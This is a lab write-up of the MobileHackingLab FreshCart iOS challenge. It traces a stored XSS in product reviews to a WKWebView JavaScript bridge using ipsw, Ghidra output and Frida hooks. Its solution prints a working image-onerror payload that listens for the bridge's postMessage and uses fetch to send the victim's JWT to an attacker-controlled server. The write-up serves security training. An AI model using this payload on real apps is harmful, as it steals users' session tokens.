Title: MobileHackingLab - FreshCart
Slug: mobile/mobilehackinglab/fresh-cart
Date: 2025-09-25 18:00
Category: Mobile

This is an iOS mobile challenge from [MobileHackingLabs](https://www.mobilehackinglab.com/course/lab-freshcart).

Freshcart contains a critical vulnerability that allows token stealing by exploiting the JavaScript to native bridge.
 
 **Objective**: Your task is to craft a payload that exploits the vulnerability in the Freshcart app to steal the user's token via the JavaScript-native bridge.


The app presents itself as follows:

![[fresh-cart-app-2.jpg]]

First step has been to register:

![[fresh-cart-app-3.jpg]]

The following product overview is then shown:

![[fresh-cart-app-1.jpg]]

Entering the detail of a product, it's possible to write a review:

![[fresh-cart-app-4.jpg]]

Testing the following payload in the "Review Content" field produces no results:

~~~
<script>alert(1)</script>
~~~

![[fresh-cart-app-5.jpg]]

However, the following payload shows that html is actually interpreted and therefore XSS attacks may be possible:

~~~
<img src=x>
~~~

![[fresh-cart-app-6.jpg]]

### Static Analysis

Dump swift classes with `ipsw`:
~~~shell
ipsw swift-dump --demangle Payload/FreshCart.app/FreshCart > classes.swift
~~~

![[fresh-cart-decompiled-1.png]]


The class `FreshCart.WebViewController` indicates that WebViews are being used; the following command is used to determine which WebView library is used:

~~~shell
strings Payload/FreshCart.app/FreshCart | grep -Ei "UIWebView|WKWebView|SFSafariViewController" 
~~~

![[fresh-cart-webview-enumeration.png]]

`WKWebView` is being used.
### Dynamic Analysis

Trace all `FreshCart.WebViewController` methods with `frida-trace`:

~~~
frida-trace -U -m "*[FreshCart.WebViewController *]" -n 'FreshCart' 
~~~


![[fresh-cart-frida-trace.png]]

The method `userContentController` is constantly invoked throughout the whole application. Following the method's code decompiled with `ghidra`:

~~~c

/* FreshCart.WebViewController.userContentController(_: __C.WKUserContentController, didReceive:
   __C.WKScriptMessage) -> () */

void __thiscall
FreshCart::WebViewController::userContentController
          (WebViewController *this,WKUserContentController *param_1,WKScriptMessage *didReceive)

{
  undefined *puVar1;
  undefined *puVar2;
  code *pcVar3;
  bool bVar4;
  WKScriptMessage *pWVar5;
  undefined7 extraout_var;
  ulong uVar6;
  ulong *puVar7;
  undefined1 *puVar8;
  NSString *pNVar9;
  long *plVar10;
  long lVar11;
  undefined7 extraout_var_00;
  void *pvVar12;
  undefined8 uVar13;
  DefaultStringInterpolation DVar14;
  char *in_x4;
  void *in_x5;
  String SVar15;
  String SVar16;
  String SVar17;
  String SVar18;
  String SVar19;
  long local_240;
  long local_238;
  ulong local_e8;
  void *local_e0;
  DefaultStringInterpolation local_d8;
  undefined8 local_d0;
  undefined1 auStack_c8 [8];
  long local_c0;
  ulong local_b8;
  void *local_b0;
  ulong local_a8;
  void *local_a0;
  long local_98;
  long local_90;
  DefaultStringInterpolation local_88;
  undefined8 local_80;
  long local_78;
  long local_70;
  long local_68;
  long local_60;
  undefined1 auStack_58 [32];
  WebViewController *local_38;
  WKScriptMessage *local_30;
  WKUserContentController *local_28;
  WebViewController *local_20;
  
  puVar2 = PTR__swift_isaMask_1000183f8;
  puVar1 = PTR_$$type_metadata_for_Swift.String_1000182b0;
  local_78 = 0;
  local_70 = 0;
  local_a8 = 0;
  local_a0 = (void *)0x0;
  pWVar5 = didReceive;
  local_38 = this;
  local_30 = didReceive;
  local_28 = param_1;
  local_20 = this;
  _objc_msgSend(didReceive,"name");
  _objc_retainAutoreleasedReturnValue();
  SVar15 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
  SVar16 = Swift::String::init("retrieveToken",0xd,1);
  SVar17.bridgeObject = in_x5;
  SVar17.str = in_x4;
  pvVar12 = SVar15.bridgeObject;
  bVar4 = Swift::String::==_infix(SVar15,SVar16,SVar17);
  _swift_bridgeObjectRelease(SVar16.bridgeObject);
  _swift_bridgeObjectRelease(SVar15.bridgeObject);
  _objc_release(pWVar5);
  uVar6 = CONCAT71(extraout_var,bVar4) & 0xffffffff;
  if (bVar4) {
    (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0xa8))();
    puVar7 = &local_b8;
    local_b8 = uVar6;
    local_b0 = pvVar12;
    local_a8 = uVar6;
    local_a0 = pvVar12;
    $$outlined_init_with_copy_of_Swift.String?(puVar7,auStack_c8);
    if (local_c0 == 0) {
      (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0x60))();
      if (puVar7 == (ulong *)0x0) {
        Swift::_assertionFailure
                  ((StaticString)0x100015a7c,(StaticString)0xb,(StaticString)0x2,0x100015170,0x44);
                    /* WARNING: Does not return */
        pcVar3 = (code *)SoftwareBreakpoint(1,0x10000b8d0);
        (*pcVar3)();
      }
      SVar15 = Swift::String::init("window.postMessage({ token: null }, \'*\');",0x29,1);
      pNVar9 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      _objc_msgSend(puVar7,"evaluateJavaScript:completionHandler:",pNVar9,0);
      _objc_release(pNVar9);
      _objc_release(puVar7);
    }
    else {
      puVar8 = auStack_c8;
      $$outlined_destroy_of_Swift.String?();
      (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0x60))();
      if (puVar8 == (undefined1 *)0x0) {
        Swift::_assertionFailure
                  ((StaticString)0x100015a7c,(StaticString)0xb,(StaticString)0x2,0x100015170,0x44);
                    /* WARNING: Does not return */
        pcVar3 = (code *)SoftwareBreakpoint(1,0x10000b69c);
        (*pcVar3)();
      }
      uVar13 = 1;
      local_d8 = Swift::DefaultStringInterpolation::init(0x27,1);
      DVar14.unknown = (undefined *)0x1;
      local_d0 = uVar13;
      SVar15 = Swift::String::init("window.postMessage({ token: \'",0x1d,1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar15,DVar14);
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      _swift_bridgeObjectRetain(pvVar12);
      if (pvVar12 == (void *)0x0) {
        Swift::_assertionFailure
                  ((StaticString)0x100015a7c,(StaticString)0xb,(StaticString)0x2,0x100015300,0x39);
                    /* WARNING: Does not return */
        pcVar3 = (code *)SoftwareBreakpoint(1,0x10000b76c);
        (*pcVar3)();
      }
      local_e8 = uVar6;
      local_e0 = pvVar12;
      Swift::DefaultStringInterpolation::$appendInterpolation
                (&local_e8,puVar1,
                 PTR_$$protocol_witness_table_for_Swift.String_:_Swift.CustomStringConvertible_in_Sw ift_1000183f0
                 ,
                 PTR_$$protocol_witness_table_for_Swift.String_:_Swift.TextOutputStreamable_in_Swift _100018468
                );
      $$outlined_destroy_of_Swift.String(&local_e8);
      DVar14.unknown = (undefined *)0x1;
      SVar15 = Swift::String::init("\' }, \'*\');",10,1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar15,DVar14);
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      DVar14.unknown = local_d8.unknown;
      _swift_bridgeObjectRetain();
      $$outlined_destroy_of_Swift.DefaultStringInterpolation(&local_d8);
      SVar15 = Swift::String::init(DVar14);
      pNVar9 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      _objc_msgSend(puVar8,"evaluateJavaScript:completionHandler:",pNVar9,0);
      _objc_release(pNVar9);
      _objc_release(puVar8);
    }
    _swift_bridgeObjectRelease(pvVar12);
  }
  pWVar5 = didReceive;
  _objc_msgSend(didReceive,"name");
  _objc_retainAutoreleasedReturnValue();
  SVar15 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
  SVar16 = Swift::String::init("storeToken",10,1);
  SVar18.bridgeObject = in_x5;
  SVar18.str = in_x4;
  bVar4 = Swift::String::==_infix(SVar15,SVar16,SVar18);
  _swift_bridgeObjectRelease(SVar16.bridgeObject);
  _swift_bridgeObjectRelease(SVar15.bridgeObject);
  _objc_release(pWVar5);
  if (bVar4) {
    pWVar5 = didReceive;
    _objc_msgSend(didReceive,"body");
    _objc_retainAutoreleasedReturnValue();
    Swift::$_bridgeAnyObjectToAny();
    plVar10 = &local_68;
    in_x4 = (char *)0x6;
    _swift_dynamicCast(plVar10,auStack_58,PTR_$$type_metadata_for_Any_100018448 + 8,puVar1);
    if (((ulong)plVar10 & 1) == 0) {
      local_240 = 0;
      local_238 = 0;
    }
    else {
      local_240 = local_68;
      local_238 = local_60;
    }
    if (local_238 == 0) {
      _swift_unknownObjectRelease(pWVar5);
    }
    else {
      local_78 = local_240;
      local_70 = local_238;
      _swift_unknownObjectRelease(pWVar5);
      lVar11 = local_240;
      (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0x98))(local_240,local_238);
      (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0x60))();
      if (lVar11 == 0) {
        Swift::_assertionFailure
                  ((StaticString)0x100015a7c,(StaticString)0xb,(StaticString)0x2,0x100015170,0x44);
                    /* WARNING: Does not return */
        pcVar3 = (code *)SoftwareBreakpoint(1,0x10000bb58);
        (*pcVar3)();
      }
      uVar13 = 1;
      local_88 = Swift::DefaultStringInterpolation::init(0x27,1);
      DVar14.unknown = (undefined *)0x1;
      local_80 = uVar13;
      SVar15 = Swift::String::init("window.postMessage({ token: \'",0x1d,1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar15,DVar14);
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      local_98 = local_240;
      local_90 = local_238;
      Swift::DefaultStringInterpolation::$appendInterpolation
                (&local_98,puVar1,
                 PTR_$$protocol_witness_table_for_Swift.String_:_Swift.CustomStringConvertible_in_Sw ift_1000183f0
                 ,
                 PTR_$$protocol_witness_table_for_Swift.String_:_Swift.TextOutputStreamable_in_Swift _100018468
                );
      DVar14.unknown = (undefined *)0x1;
      SVar15 = Swift::String::init("\' }, \'*\');",10,1);
      Swift::DefaultStringInterpolation::appendLiteral(SVar15,DVar14);
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      DVar14.unknown = local_88.unknown;
      _swift_bridgeObjectRetain();
      $$outlined_destroy_of_Swift.DefaultStringInterpolation(&local_88);
      SVar15 = Swift::String::init(DVar14);
      pNVar9 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(SVar15.bridgeObject);
      _objc_msgSend(lVar11,"evaluateJavaScript:completionHandler:",pNVar9,0);
      _objc_release(pNVar9);
      _objc_release(lVar11);
      _swift_bridgeObjectRelease(local_238);
    }
  }
  _objc_msgSend(didReceive,"name");
  _objc_retainAutoreleasedReturnValue();
  SVar15 = (extension_Foundation)::Swift::String::$_unconditionallyBridgeFromObjectiveC();
  SVar16 = Swift::String::init("removeToken",0xb,1);
  SVar19.bridgeObject = in_x5;
  SVar19.str = in_x4;
  bVar4 = Swift::String::==_infix(SVar15,SVar16,SVar19);
  _swift_bridgeObjectRelease(SVar16.bridgeObject);
  _swift_bridgeObjectRelease(SVar15.bridgeObject);
  _objc_release(didReceive);
  uVar6 = CONCAT71(extraout_var_00,bVar4) & 0xffffffff;
  if (bVar4) {
    (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0xa0))();
    (**(code **)((*(ulong *)this & *(ulong *)puVar2) + 0x60))();
    if (uVar6 == 0) {
      Swift::_assertionFailure
                ((StaticString)0x100015a7c,(StaticString)0xb,(StaticString)0x2,0x100015170,0x44);
                    /* WARNING: Does not return */
      pcVar3 = (code *)SoftwareBreakpoint(1,0x10000bdb8);
      (*pcVar3)();
    }
    SVar15 = Swift::String::init("window.postMessage({ token: \'\' }, \'*\');",0x27,1);
    pNVar9 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
    _swift_bridgeObjectRelease(SVar15.bridgeObject);
    _objc_msgSend(uVar6,"evaluateJavaScript:completionHandler:",pNVar9,0);
    _objc_release(pNVar9);
    _objc_release(uVar6);
  }
  return;
}
~~~

The function `evaluateJavaScript:completionHandler` function is invoked from various branches in this code. This suggests that `WKWebView`'s native Javascript bridge is being used.

- A post message containing the current user JWT token is sent whenever the method `userContentController` is invoked. 

![[fresh-cart-decompiled-2.png]]

By using `frida`, a script for intercepting `evaluateJavaScript:completionHandler` and dumping its arguments has been written. This is necessary to understand whether this function is actually used within the XSS-vulnerable functionality. 

First, enumerate the method signature:

~~~
frida -U -n 'FreshCart' 
...
> ObjC.classes['WKWebView'].$ownMethods.filter(x=>x.includes('evaluate'))
~~~


![[fresh-cart-frida-1.png]]

Following the complete script:

~~~javascript
Interceptor.attach(ObjC.classes['WKWebView']['- evaluateJavaScript:completionHandler:'].implementation,{
    onEnter: function(args){
        console.log('[!] Entered evaluateJavaScript function...');
        console.log("[>] Arguments: " + new ObjC.Object(args[2]));;
    },
    onLeave: function (retval) {
        // do nothing
    }
});
~~~

![[fresh-cart-frida-script.png]]

Load the script:

~~~
> %load hook.js
~~~

![[fresh-cart-frida-2.png]]

Interacting with the application confirmed that the vulnerable function is executed (also) on the product detail view which is apparently vulnerable to Cross-Site Scripting.

### Solution

By providing the following payload, the post message will be intercepted, base64-encoded and sent to an attacker-controller server:

~~~
<img src=x onerror='window.addEventListener("message", (event) => {fetch("http://192.168.10.222:8000?data=" + btoa(JSON.stringify(event.data)))});' />
~~~


![[fresh-cart-app-7.jpg]]


The exfiltrated data is the decoded and the victim JWT obtained:

![[fresh-cart-solution.png]]



